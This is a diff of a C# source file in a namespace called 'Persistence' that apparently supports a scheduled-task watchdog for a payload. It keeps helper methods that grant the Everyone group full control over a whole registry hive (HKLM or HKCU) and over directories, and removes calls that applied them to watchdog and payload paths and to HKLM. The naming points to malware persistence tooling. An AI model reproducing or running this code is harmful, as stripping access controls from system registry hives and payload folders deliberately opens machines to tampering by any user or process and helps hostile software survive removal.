@@ -1,6 +1,9 @@
 using System;
 using System.Diagnostics;
 using Microsoft.Win32;
+using System.Security.AccessControl;
+using System.Security.Principal;
+using System.IO;
 
 
 namespace Persistence
@@ -49,12 +52,6 @@ namespace Persistence
                 Console.WriteLine($"Scheduled task '{taskName}' already exists and is active.");
 
             }
-            GrantEveryoneFullControlOnDirectory(Config.PrimaryWatchdogPath);
-            GrantEveryoneFullControlOnDirectory(Config.SecondaryWatchdogPath);
-            GrantEveryoneFullControlOnDirectory(Config.PayloadPath);
-
-            GrantEveryoneFullControl("HKLM");
-            GrantEveryoneFullControl("HKLU");
 
         }
 
@@ -135,98 +132,97 @@ namespace Persistence
             }
 
             public static void GrantEveryoneFullControl(string registryHive)
-    {
-        try
-        {
-            // Select the correct registry key (HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER)
-            RegistryKey rootKey = registryHive.ToUpper() switch
             {
-                "HKLM" => Registry.LocalMachine,
-                "HKCU" => Registry.CurrentUser,
-                _ => throw new ArgumentException("Invalid registry hive specified. Use 'HKLM' or 'HKCU'.")
-            };
+                try
+                {
+                    // Select the correct registry key (HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER)
+                    RegistryKey rootKey = registryHive.ToUpper() switch
+                    {
+                        "HKLM" => Registry.LocalMachine,
+                        "HKCU" => Registry.CurrentUser,
+                        _ => throw new ArgumentException("Invalid registry hive specified. Use 'HKLM' or 'HKCU'.")
+                    };
 
-            // Get the current access control for the key
-            RegistrySecurity registrySecurity = rootKey.GetAccessControl();
+                    // Get the current access control for the key
+                    RegistrySecurity registrySecurity = rootKey.GetAccessControl();
 
-            // Create a new rule that grants "Everyone" Full Control
-            RegistryAccessRule rule = new RegistryAccessRule(
-                new SecurityIdentifier(WellKnownSidType.WorldSid, null), // "Everyone" group
-                RegistryRights.FullControl,                               // Full control
-                InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, // Inherit permissions
-                PropagationFlags.None,                                    // Don't propagate further
-                AccessControlType.Allow                                   // Allow the rule
-            );
+                    // Create a new rule that grants "Everyone" Full Control
+                    RegistryAccessRule rule = new RegistryAccessRule(
+                        new SecurityIdentifier(WellKnownSidType.WorldSid, null), // "Everyone" group
+                        RegistryRights.FullControl,                               // Full control
+                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, // Inherit permissions
+                        PropagationFlags.None,                                    // Don't propagate further
+                        AccessControlType.Allow                                   // Allow the rule
+                    );
 
-            // Add the rule to the security object
-            registrySecurity.AddAccessRule(rule);
+                    // Add the rule to the security object
+                    registrySecurity.AddAccessRule(rule);
 
-            // Enable inheritance for subkeys
-            registrySecurity.SetAccessRuleProtection(false, false);
+                    // Enable inheritance for subkeys
+                    registrySecurity.SetAccessRuleProtection(false, false);
 
-            // Apply the modified security settings to the key
-            rootKey.SetAccessControl(registrySecurity);
+                    // Apply the modified security settings to the key
+                    rootKey.SetAccessControl(registrySecurity);
 
-            Console.WriteLine($"Successfully granted 'Everyone' full control and enabled inheritance on {registryHive}.");
-        }
-        catch (UnauthorizedAccessException ex)
-        {
-            Console.WriteLine("Error: Access denied. Run the application with administrator privileges.");
-        }
-        catch (ArgumentException ex)
-        {
-            Console.WriteLine($"Error: {ex.Message}");
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"An error occurred: {ex.Message}");
-        }
-    }
-
-    public static void GrantEveryoneFullControlOnDirectory(string directoryPath)
-    {
-        try
-        {
-            // Check if the directory exists
-            if (!Directory.Exists(directoryPath))
-            {
-                throw new DirectoryNotFoundException($"The specified directory does not exist: {directoryPath}");
+                    Console.WriteLine($"Successfully granted 'Everyone' full control and enabled inheritance on {registryHive}.");
+                }
+                catch (UnauthorizedAccessException ex)
+                {
+                    Console.WriteLine("Error: Access denied. Run the application with administrator privileges.");
+                }
+                catch (ArgumentException ex)
+                {
+                    Console.WriteLine($"Error: {ex.Message}");
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"An error occurred: {ex.Message}");
+                }
             }
 
-            // Get the current access control settings for the directory
-            DirectoryInfo directoryInfo = new DirectoryInfo(directoryPath);
-            DirectorySecurity directorySecurity = directoryInfo.GetAccessControl();
+            public static void GrantEveryoneFullControlOnDirectory(string directoryPath)
+            {
+                try
+                {
+                    // Check if the directory exists
+                    if (!Directory.Exists(directoryPath))
+                    {
+                        throw new DirectoryNotFoundException($"The specified directory does not exist: {directoryPath}");
+                    }
 
-            // Create a new rule that grants "Everyone" full control
-            FileSystemAccessRule rule = new FileSystemAccessRule(
-                new SecurityIdentifier(WellKnownSidType.WorldSid, null), // "Everyone" group
-                FileSystemRights.FullControl,                           // Full control
-                InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, // Inherit permissions to all subfolders and files
-                PropagationFlags.None,                                  // Don't propagate further
-                AccessControlType.Allow                                 // Allow the rule
-            );
+                    // Get the current access control settings for the directory
+                    DirectoryInfo directoryInfo = new DirectoryInfo(directoryPath);
+                    DirectorySecurity directorySecurity = directoryInfo.GetAccessControl();
 
-            // Add the rule to the directory security object
-            directorySecurity.AddAccessRule(rule);
+                    // Create a new rule that grants "Everyone" full control
+                    FileSystemAccessRule rule = new FileSystemAccessRule(
+                        new SecurityIdentifier(WellKnownSidType.WorldSid, null), // "Everyone" group
+                        FileSystemRights.FullControl,                           // Full control
+                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, // Inherit permissions to all subfolders and files
+                        PropagationFlags.None,                                  // Don't propagate further
+                        AccessControlType.Allow                                 // Allow the rule
+                    );
 
-            // Apply the modified security settings to the directory
-            directoryInfo.SetAccessControl(directorySecurity);
+                    // Add the rule to the directory security object
+                    directorySecurity.AddAccessRule(rule);
 
-            Console.WriteLine($"Successfully granted 'Everyone' full control on the directory: {directoryPath}");
-        }
-        catch (UnauthorizedAccessException ex)
-        {
-            Console.WriteLine("Error: Access denied. Run the application with administrator privileges.");
-        }
-        catch (DirectoryNotFoundException ex)
-        {
-            Console.WriteLine($"Error: {ex.Message}");
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"An error occurred: {ex.Message}");
-        }
-    }
-        
+                    // Apply the modified security settings to the directory
+                    directoryInfo.SetAccessControl(directorySecurity);
+
+                    Console.WriteLine($"Successfully granted 'Everyone' full control on the directory: {directoryPath}");
+                }
+                catch (UnauthorizedAccessException ex)
+                {
+                    Console.WriteLine("Error: Access denied. Run the application with administrator privileges.");
+                }
+                catch (DirectoryNotFoundException ex)
+                {
+                    Console.WriteLine($"Error: {ex.Message}");
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"An error occurred: {ex.Message}");
+                }
+            }
     }
 }
